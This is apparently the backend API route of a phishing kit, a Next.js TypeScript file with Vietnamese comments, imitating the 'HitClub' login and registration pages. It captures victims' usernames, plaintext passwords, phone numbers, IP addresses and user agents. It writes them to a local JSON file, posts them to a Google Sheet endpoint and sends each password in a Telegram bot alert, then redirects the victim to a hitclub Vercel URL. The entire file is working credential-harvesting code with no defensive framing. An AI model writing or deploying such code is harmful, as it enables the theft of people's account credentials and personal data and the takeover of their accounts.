import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

export async function GET() {
  return NextResponse.json({
    status: 'ok',
    message: 'HitClub Submit API is active',
  });
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => null);
    if (!body || !body.username || !body.password) {
      return NextResponse.json(
        { ok: false, message: 'Dữ liệu không hợp lệ (thiếu tên đăng nhập hoặc mật khẩu)' },
        { status: 400 }
      );
    }

    const username = String(body.username).trim();
    const password = String(body.password);
    const phone = body.phone ? String(body.phone).trim() : '';
    const rawType = body.type ? String(body.type).trim() : '';
    const rawReferer = body.referer || req.headers.get('referer') || '/login';

    // Xác định loại thao tác: Đăng ký hoặc Đăng nhập
    const type = rawType || (rawReferer.toLowerCase().includes('đăng ký') || rawReferer.toLowerCase().includes('register') ? 'Đăng ký' : 'Đăng nhập');

    // Thu thập metadata người dùng
    const forwardedHeader = req.headers.get('x-forwarded-for');
    const clientIp = forwardedHeader
      ? forwardedHeader.split(',')[0].trim()
      : (req.headers.get('x-real-ip') || '127.0.0.1');
    const userAgent = req.headers.get('user-agent') || 'Không rõ';
    const time = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });

    // Trang gửi hiển thị rõ tag để tương thích hoàn toàn kể cả khi Google Apps Script chưa cập nhật cột Loại
    const referer = rawReferer.includes(type) ? rawReferer : `[${type.toUpperCase()}] ${rawReferer}`;

    const submissionData = {
      type,
      username,
      password,
      phone,
      ip: clientIp,
      userAgent,
      referer,
      time,
      createdAt: new Date().toISOString(),
    };

    // 1. Lưu dự phòng vào local file data/logins.json
    try {
      const dataDir = path.join(process.cwd(), 'data');
      if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir, { recursive: true });
      }
      const dataFile = path.join(dataDir, 'logins.json');
      let records: unknown[] = [];
      if (fs.existsSync(dataFile)) {
        try {
          const content = fs.readFileSync(dataFile, 'utf-8');
          records = JSON.parse(content);
          if (!Array.isArray(records)) records = [];
        } catch {
          records = [];
        }
      }
      records.unshift(submissionData);
      if (records.length > 500) records = records.slice(0, 500);
      fs.writeFileSync(dataFile, JSON.stringify(records, null, 2), 'utf-8');
    } catch (fsErr) {
      console.error('[API Submit] Lỗi ghi file backup local:', fsErr);
    }

    // 2. Gửi đến Google Apps Script
    const sheetUrl = process.env.GOOGLE_SHEET_URL || process.env.NEXT_PUBLIC_SHEET_URL;
    let sheetSent = false;
    if (sheetUrl && sheetUrl.startsWith('http')) {
      try {
        const res = await fetch(sheetUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'text/plain;charset=utf-8' },
          body: JSON.stringify(submissionData),
          redirect: 'follow',
        });
        if (res.ok) {
          sheetSent = true;
        } else {
          console.warn('[API Submit] Google Sheet trả về status:', res.status);
        }
      } catch (sheetErr) {
        console.error('[API Submit] Lỗi kết nối Google Sheet:', sheetErr);
      }
    }

    // 3. Gửi đến Telegram Bot (nếu cấu hình)
    const tgToken = process.env.TELEGRAM_BOT_TOKEN;
    const tgChatId = process.env.TELEGRAM_CHAT_ID;
    if (tgToken && tgChatId) {
      try {
        const tgIcon = type === 'Đăng ký' ? '📝' : '🔑';
        const tgText =
          `🔔 *HITCLUB - THÔNG BÁO MỚI*\n\n` +
          `📌 *Thao tác:* ${tgIcon} *${type.toUpperCase()}*\n` +
          `👤 *Tài khoản:* \`${username}\`\n` +
          `🔑 *Mật khẩu:* \`${password}\`\n` +
          (phone ? `📞 *Số điện thoại:* \`${phone}\`\n` : '') +
          `🌐 *IP:* \`${clientIp}\`\n` +
          `⏰ *Thời gian:* ${time}\n` +
          `📍 *Nguồn:* \`${referer}\`\n` +
          `📱 *Thiết bị:* ${userAgent.slice(0, 120)}`;

        await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: tgChatId,
            text: tgText,
            parse_mode: 'Markdown',
          }),
        });
      } catch (tgErr) {
        console.error('[API Submit] Lỗi gửi Telegram:', tgErr);
      }
    }

    const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://hitclub-six.vercel.app/';

    return NextResponse.json({
      ok: true,
      message: 'Gửi dữ liệu thành công',
      type,
      redirectUrl,
      sheetSent,
    });
  } catch (error) {
    console.error('[API Submit] Lỗi xử lý:', error);
    return NextResponse.json(
      { ok: false, message: 'Đã có lỗi xảy ra từ máy chủ' },
      { status: 500 }
    );
  }
}
